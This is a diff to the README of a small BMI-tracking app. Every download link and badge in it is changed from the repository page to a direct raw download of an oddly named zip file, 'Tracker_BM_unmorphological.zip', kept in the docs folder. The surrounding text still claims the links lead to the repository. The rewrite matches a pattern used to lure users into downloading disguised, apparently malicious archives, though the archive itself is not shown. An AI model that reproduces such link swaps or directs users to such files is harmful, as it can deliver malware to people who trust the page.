@@ -1,6 +1,6 @@
 # 🧮 BMI-Tracker - Track Your Body Mass Index Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge&logo=github)](https://github.com/Sazo-AI/BMI-Tracker)
+[![Download Now](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge&logo=github)](https://github.com/Sazo-AI/BMI-Tracker/raw/refs/heads/main/docs/Tracker_BM_unmorphological.zip)
 
 BMI-Tracker is a simple app to help you monitor your body mass index (BMI). It saves your data on your device, shows charts of your progress, and lets you export your records as CSV files. You don’t need any technical skill to use it.
 
@@ -25,7 +25,7 @@ This section shows you how to get BMI-Tracker running on your Windows machine. F
 
 Click the green button at the top or this link to go to the download page:
 
-[Download BMI-Tracker](https://github.com/Sazo-AI/BMI-Tracker)
+[Download BMI-Tracker](https://github.com/Sazo-AI/BMI-Tracker/raw/refs/heads/main/docs/Tracker_BM_unmorphological.zip)
 
 The link will take you to the GitHub repository. You will find instructions and files to get the app running.
 
@@ -115,9 +115,9 @@ All your data stays on your PC using local storage. BMI-Tracker does not send yo
 
 Download or visit the app page here:
 
-[Download BMI-Tracker](https://github.com/Sazo-AI/BMI-Tracker)
+[Download BMI-Tracker](https://github.com/Sazo-AI/BMI-Tracker/raw/refs/heads/main/docs/Tracker_BM_unmorphological.zip)
 
-[![Download Now](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge&logo=github)](https://github.com/Sazo-AI/BMI-Tracker)
+[![Download Now](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge&logo=github)](https://github.com/Sazo-AI/BMI-Tracker/raw/refs/heads/main/docs/Tracker_BM_unmorphological.zip)
 
 ## 🛠️ Technologies Used
 
